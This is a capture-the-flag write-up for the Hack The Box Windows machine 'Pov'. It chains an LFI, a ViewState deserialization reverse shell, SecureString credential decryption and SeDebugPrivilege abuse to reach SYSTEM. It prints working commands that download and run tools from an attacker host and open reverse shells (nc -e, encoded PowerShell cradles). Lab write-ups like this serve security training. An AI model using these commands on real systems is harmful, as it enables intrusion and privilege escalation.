---
layout: writeup
category: HTB
description: Pov is a Windows machine with a medium difficulty rating in which we have to do the following things. First, we have to abuse a LFI, to see web.config and consequently craft a serialized payload for VIEWSTATE with ysoserial.exe to gain access as sfitz. Then, to gain access as alaading, we can see a powershell SecureString password in a XML file. Finally, we can abuse SeDebugPrivilege of alaading for attaching to a process running as administrator and gain a shell as administrator.
points: 30
solves: 2435
tags: lfi web.config deserialization exploiting-viewstate decrypting-securestring sedebugprivilege
date: 2024-06-08
title: HTB Pov Writeup
comments: true
---

Pov is a Windows machine with a medium difficulty rating in which we have to do the following things. First, we have to abuse a LFI, to see web.config and consequently craft a serialized payload for VIEWSTATE with ysoserial.exe to gain access as sfitz. Then, to gain access as alaading, we can see a powershell SecureString password in a XML file. Finally, we can abuse SeDebugPrivilege of alaading for attaching to a process running as administrator and gain a shell as administrator.

# Enumeration

## Port scanning

We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.251
# Nmap 7.94SVN scan initiated Thu May  9 22:30:52 2024 as: nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.251
Nmap scan report for 10.10.11.251
Host is up (0.13s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
|_http-title: pov.htb
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  9 22:31:31 2024 -- 1 IP address (1 host up) scanned in 39.19 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".


## Web enumeration
            
First let's see the technologies used with whatweb:
```bash
❯ whatweb http://10.10.11.251
http://10.10.11.251 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
```

We see the domain pov.htb in the title, so add this line to the /etc/hosts:

```plaintext
10.10.11.251 pov.htb
```

This domain doesn't look nothing different:

```bash
❯ whatweb http://pov.htb
http://pov.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
```

Enumerating subdomains, we can see dev.pov.htb:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.pov.htb" -u http://pov.htb --hh=12330
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://pov.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000019:   302        1 L      10 W       152 Ch      "dev"                                                                                                                  

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

I will modify the line of above to put it in the /etc/hosts:

```plaintext
10.10.11.251 pov.htb dev.pov.htb
```

Let's see the technologies used here(dev.pov.htb) with whatweb:
```bash
❯ whatweb http://dev.pov.htb
http://dev.pov.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], RedirectLocation[http://dev.pov.htb/portfolio/], Title[Document Moved], X-Powered-By[ASP.NET]
http://dev.pov.htb/portfolio/ [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], JQuery[3.4.1], Meta-Author[Devcrud], Microsoft-IIS[10.0], Script, Title[dev.pov.htb], X-Powered-By[ASP.NET]
```

It redirect us to /portfolio so it seems like a portfolio of somebody.

# Access as sfitz

Looking at pov.htb, we can see that it's just a static page. The only interesting thing is that `dev` subdomain also appears here:

![Dev subdomain in main page](/assets/images/Pov/dev_subdomain_in_main_page.png)

Looking at dev.pov.htb, we can see a 'Download CV' link that if we intercept with burpsuite, we can see that it requests for a file called `cv.pdf`:

![Download CV in burpsuite](/assets/images/Pov/download_cv_in_burpsuite.png)

Trying LFI (as it searches for a file), works successfully and we can see web.config:

![web.config in LFI](/assets/images/Pov/web.config_in_lfi.png)

So we can follow [this guide](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/) and craft a payload that gives us reverse shell. For that, I will spawn a nc listener and use a windows virtual machine to download ysoserial.net and craft the payload with a command from [revshells.com](https://revshells.com)(Powershell #3 Base64):

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

![ysoserial command in windows](/assets/images/Pov/ysoserial_command_in_windows.png)

Copy the payload and paste it in `_VIEWSTATE` value:

![payload_pasted_in_viewstate](/assets/images/Pov/payload_pasted_in_viewstate.png)

We receive the shell:

![Shell received](/assets/images/Pov/shell_received.png)

Now I will stabilize the shell with ConPtyShell to be able to do ctrl+c, see the errors of powershell and have autocompletion. For this, I will use a http server to share the ps1 script, spawn a nc listener and execute this commands in the victim:

```powershell
PS C:\Users\sfitz\Documents> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.225/Invoke-ConPtyShell.ps1")
PS C:\Users\sfitz\Documents> Invoke-ConPtyShell -RemoteIp 10.10.14.225 -RemotePort 443 -Rows 50 -Cols 184
```

Also, in the nc listener, we have to do ctrl+z, execute `stty raw -echo; fg` and do ctrl+l.

# Access as alaading

In the Documents folder of sfitz there is a connection.xml file that has credentials for alaading:

```powershell
PS C:\Users\sfitz\Documents> type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

So we can decrypt it with this command:

```powershell
PS C:\Users\sfitz\Documents> $cred = Import-CliXml -Path .\connection.xml; $cred.GetNetworkCredential() | Format-List *


UserName       : alaading
Password       : f8gQ8fynP44ek1m3
SecurePassword : System.Security.SecureString 
Domain         :
```

Now with this credential, we are able to execute a command as alaading. In my case I will execute a reverse shell with RunasCs.exe:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

```powershell
PS C:\Users\sfitz\Documents> cd C:\Windows\Temp
PS C:\Windows\Temp> mkdir test


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/8/2024   2:21 PM                test


PS C:\Windows\Temp> cd .\test\
PS C:\Windows\Temp\test>  certutil.exe -f -urlcache -split http://10.10.14.225/RunasCs.exe
****  Online  ****
  0000  ...
  ca00
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\test> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.225:443

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-8e17e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1664 created in background.
```

And we receive it
```powershell
❯ nc -lvnp 443
listening on [any] 443 ...
PS C:\Users\alaading\Documents>
```

Also, I will use ConPtyShell as before for having a better shell.

# Access as nt authority/system

Looking at our privileges, we can see SeDebugPrivilege, which we can abuse as shown [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege) with [this tool](https://github.com/bruno-1337/SeDebugPrivilege-Exploit):
```powershell
# Download
PS C:\Users\alaading\Documents> cd C:\Windows\Temp
PS C:\Windows\Temp> mkdir privesc


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/8/2024   1:53 PM                privesc


PS C:\Windows\Temp> cd privesc
PS C:\Windows\Temp\privesc> certutil.exe -f -urlcache -split http://10.10.14.225/SeDebugPrivesc.exe
****  Online  ****
  0000  ...
  4600
CertUtil: -URLCache command completed successfully.

# See processes running as administrator 
PS C:\Users\alaading\Documents> Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id

ProcessName     Id 
-----------     -- 
chisel        1300 
chisel        4872 
cmd            644 
cmd            828 
cmd           1048 
cmd           4108 
cmd           4464 
conhost        692 
conhost       1664 
conhost       3684 
conhost       4376 
conhost       4420 
conhost       4688 
conhost       4748 
conhost       4936 
csrss          380 
csrss          488 
dllhost       3512 
dwm            988 
fontdrvhost    784 
fontdrvhost    792 
Idle             0 
LogonUI       4148 
lsass          632 
msdtc         3876 
powershell      64 
powershell      96 
powershell    1372 
powershell    1692 
powershell    2952 
powershell    3196 
powershell    3372 
powershell    3968 
powershell    4780 
powershell    4848 
Registry        88 
services       616 
shell         5052 
smss           296 
System           4 
VGAuthService 2296 
vm3dservice   2288 
vm3dservice   2940 
vmtoolsd      2308 
w3wp          4432 
wininit        480 
winlogon       548
WmiPrvSE      3840
wsmprovhost   4040
```

The process `winlogon` always run as Administrator, so we can use this PID and test if we can execute commands by doing a ping to our machine and listening with tcpdump for icmp packets:

```powershell
PS C:\Windows\Temp\privesc> .\SeDebugPrivesc.exe 548 "C:\windows\system32\cmd.exe /c ping -n 1 10.10.14.225"
pid= 548
[+] New process is created successfully.
    |-> PID : 2952
    |-> TID : 4788
```

We receive the icmp packet:


```bash
❯ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:14:41.545966 IP pov.htb > kali: ICMP echo request, id 1, seq 1, length 40
11:14:41.546005 IP kali > pov.htb: ICMP echo reply, id 1, seq 1, length 40
```

Now we can use a nc.exe binary to have a shell of administrator:

```powershell
PS C:\Windows\Temp\privesc> certutil.exe -f -urlcache -split "http://10.10.14.225/nc.exe"
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\privesc> .\SeDebugPrivesc.exe 548 ".\nc.exe -e cmd.exe 10.10.14.225 443"
pid= 548
[+] New process is created successfully.
    |-> PID : 3632
    |-> TID : 3504
```

And we receive the shell:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.225] from (UNKNOWN) [10.10.11.251] 50226
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\Temp\privesc>
```

For some reason we can't execute some commands so I will upgrade my alaading shell to a winrm session with the credentials I have. For that I will use chisel to transfer port 5985 to my machine:

Server:
```bash
❯ ./chisel_linux server --reverse -p 1234
2024/06/09 11:45:27 server: Reverse tunnelling enabled
2024/06/09 11:45:27 server: Fingerprint ts/bkY9kZ0ffl5bFrAdhQdGTAe9AjiEgzTPuqIFqW5c=
2024/06/09 11:45:27 server: Listening on http://0.0.0.0:1234
```

Client:

```powershell 
PS C:\windows\Temp\privesc> .\chisel_windows.exe client 10.10.14.225:1234 R:5985:127.0.0.1:5985
```

Now we can login to winrm:

```powershell
❯ evil-winrm -i localhost -u alaading -p 'f8gQ8fynP44ek1m3'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alaading\Documents> 
```

Now execute SeDebugPrivesc to execute ConPtyShell as Administrator:

```powershell
*Evil-WinRM* PS C:\Windows\Temp\test> .\SeDebugPrivesc.exe 548 "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBk
AFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMgA1AC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBo
AGUAbABsACAALQBSAGUAbQBvAHQAZQBJAHAAIAAxADAALgAxADAALgAxADQALgAyADIANQAgAC0AUgBlAG0AbwB0AGUAUABvAHIAdAAgADQANAAzACAALQBSAG8AdwBzACAANQAwACAALQBDAG8AbABzACAAMQA4ADQA"
pid= 548
[+] New process is created successfully.
    |-> PID : 4476
    |-> TID : 1964
```

And we receive the shell as nt authority/system with root.txt readable:

```powershell
PS C:\Windows\Temp\test> whoami
nt authority\system
PS C:\Windows\Temp\test> type C:\Users\Administrator\Desktop\root.txt 
30****************************4b 
```

That's the machine. Hope you liked it :).
